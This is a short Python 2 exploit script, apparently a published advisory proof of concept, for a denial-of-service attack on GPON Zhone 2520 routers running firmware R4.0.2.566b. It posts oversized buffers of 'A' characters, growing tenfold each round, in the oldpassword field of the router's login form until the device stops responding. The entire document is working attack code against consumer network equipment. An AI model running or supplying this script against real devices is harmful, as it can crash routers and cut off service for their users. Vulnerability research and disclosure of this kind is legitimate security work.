from httplib2 import Http
from urllib import urlencode
import sys,time
#main function
if __name__ == "__main__":
        if(len(sys.argv) != 2):
                print '*********************************************************************************'
                print ' GPON Zhone R4.0.2.566b D.O.S.'
                print ' Tested on'
                print '          GPON Zhone 2520'
                print '          Hardware: 0040-48-02'
                print '          Software: R4.0.2.566b'
                print '                                 '
                print ' Usage : python', sys.argv[0] + ' <ip>'
                print ' Ex :    python',sys.argv[0] + ' 192.168.15.1'
                print ' Author : Kaczinski lramirez@websec.mx '
                print ' URL : http://www.websec.mx/advisories'
                print '*********************************************************************************'
                sys.exit()

HOST = sys.argv[1]
LIMIT = 100000
COUNT = 1
SIZE = 10
BUFFER = ''

while len(BUFFER) < LIMIT:
        BUFFER = '\x41' * COUNT
        print "[+] Sending evil buffer with length:", len(BUFFER)
        h = Http()
        h.follow_redirects = True
        data = dict(XWebPageName=buffer, oldpassword=BUFFER, password="", password2="test", passwdtip="test")
        try:
                resp, content = h.request("http://" + HOST + "/GponForm/LoginForm", "POST", urlencode(data))
        except:
                print "[+] GPON should be down, is not responding..."
                sys.exit()
        COUNT = COUNT * SIZE

print "[-] GPON not vulnerable"